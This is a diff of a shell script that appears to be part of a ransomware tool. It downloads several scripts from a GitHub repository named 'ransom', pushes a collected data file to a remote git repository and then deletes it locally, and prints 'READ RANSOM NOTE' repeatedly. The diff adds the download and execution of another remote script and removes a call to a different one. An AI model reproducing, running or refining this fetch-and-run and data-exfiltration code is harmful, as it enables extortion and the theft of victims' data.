@@ -1,6 +1,8 @@
 wget https://github.com/samsepi0lw/ransom/blob/main/monsterwith23faces.py?raw=true
 wget https://github.com/samsepi0lw/ransom/blob/main/after_ransom_is_given_run_this.sh?raw=true
 wget https://github.com/samsepi0lw/ransom/blob/main/scaredstraight.py?raw=true
+wget https://github.com/samsepi0lw/ransom/blob/main/scared.sh?raw=true
+mv scared.sh?raw=true scared.sh
 mv monsterwith23faces.py\?raw=true monsterwith23faces.py
 mv after_ransom_is_given_run_this.sh\?raw=true after_ransom_is_given_run_this.sh
 mv scaredstraight.py?raw=true scaredstraight.py
@@ -16,7 +18,6 @@ git add ./data.txt
 git commit -m "Uploaded data file"
 git push origin master
 rm ./data.txt
-python scaredstraight.py
 clear
 echo "READ RANSOM NOTE"
 echo "READ RANSOM NOTE"
@@ -30,3 +31,5 @@ echo "READ RANSOM NOTE"
 echo "READ RANSOM NOTE"
 echo "READ RANSOM NOTE"
 echo "READ RANSOM NOTE"
+sleep 3
+scared.sh
